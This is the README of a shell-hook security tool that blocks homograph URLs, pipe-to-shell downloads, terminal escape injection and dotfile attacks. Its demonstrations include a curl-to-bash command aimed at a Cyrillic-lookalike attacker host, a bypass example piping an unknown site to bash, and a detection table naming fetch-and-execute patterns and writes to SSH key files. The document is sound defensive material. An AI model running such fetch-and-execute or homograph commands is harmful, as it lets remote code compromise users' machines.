# tirith

**Your browser would catch this. Your terminal won't.**

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.

**Tirith stands at the gate.**

```bash
brew install sheeki03/tap/tirith && eval "$(tirith init)"
```

That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.

Also available via `npm install -g tirith`, `cargo install tirith`, `scoop`, and [more](#install).

## See it work

**Homograph attack — blocked before execution:**

```
$ curl -sSL https://іnstall.example-clі.dev | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Set TIRITH=0 to bypass (use with caution)
```

The command never executes.

**Pipe-to-shell with clean URL — warned, not blocked:**

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Warning prints to stderr. Command still runs.

**Normal commands — invisible:**

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. You forget tirith is running.

## What it catches

**30 rules across 7 categories.** All analysis is local. No network calls.

| Category | What it stops |
|----------|--------------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels |
| **Terminal injection** | ANSI escape sequences that rewrite your display, bidi overrides that reverse text, zero-width characters that hide in domains |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
| **Dotfile attacks** | Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` — blocked, not just warned |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs |
| **Credential exposure** | `http://user:pass@host` userinfo tricks, shortened URLs hiding destinations |

## Install

**macOS:**

```bash
brew install sheeki03/tap/tirith
```

**Linux / macOS (shell script):**

```bash
curl -fsSL https://raw.githubusercontent.com/sheeki03/tirith/main/scripts/install.sh | sh
```

**npm:**

```bash
npm install -g tirith
```

**Cargo:**

| Shell | Hook type | Tested on |
|-------|-----------|-----------|
| zsh | preexec + paste widget | 5.8+ |

## Commands

```
tirith check -- <cmd>           Analyze a command without executing
tirith paste                    Analyze clipboard/pasted content
tirith score <url>              URL trust breakdown
tirith diff <url>               Byte-level Unicode comparison
tirith why                      Explain the last triggered rule
tirith run <url>                Download-first safe installer runner
tirith receipt {last,list,verify}  Install script tracking
tirith init                     Print shell hook for eval
tirith doctor                   Diagnostic info (paths, shell, policy)
```

**`tirith run`** replaces `curl | bash` with a safe workflow: download to temp file, show SHA256, static analysis, review in pager, execute only after confirmation. Creates a receipt you can verify later.

**`tirith diff`** shows you exactly what's wrong, byte by byte:

```
$ tirith diff https://exаmple.com
  Position 3: expected 0x61 (Latin a) | got 0xd0 0xb0 (Cyrillic а)
```

## What tirith never does

- **No network calls** during `check` or `paste` — all analysis is local
- **No command rewriting** — tirith never modifies what you typed
- **No telemetry** — nothing leaves your machine, ever
- **No background processes** — invoked per-command, exits immediately
- **No cloud dependency** — works offline, no accounts, no API keys

---

## Configuration

Tirith uses a YAML policy file. Discovery order:
1. `.tirith/policy.yaml` in current directory (walks up to repo root)
2. `~/.config/tirith/policy.yaml`

```yaml
version: 1
allowlist:
  - "get.docker.com"
  - "sh.rustup.rs"

severity_overrides:
  docker_untrusted_registry: critical

fail_mode: open  # or "closed" for strict environments
```

More examples in [docs/cookbook.md](docs/cookbook.md).

**Bypass** for the rare case you know exactly what you're doing:

```bash
TIRITH=0 curl -L https://something.xyz | bash
```

Organizations can disable this: `allow_bypass: false` in policy.

---

## Data handling

Local JSONL audit log at `~/.local/share/tirith/log.jsonl`:
- Timestamp, action, rule ID, redacted command preview
- **No** full commands, environment variables, or file contents

Disable: `export TIRITH_LOG=0`
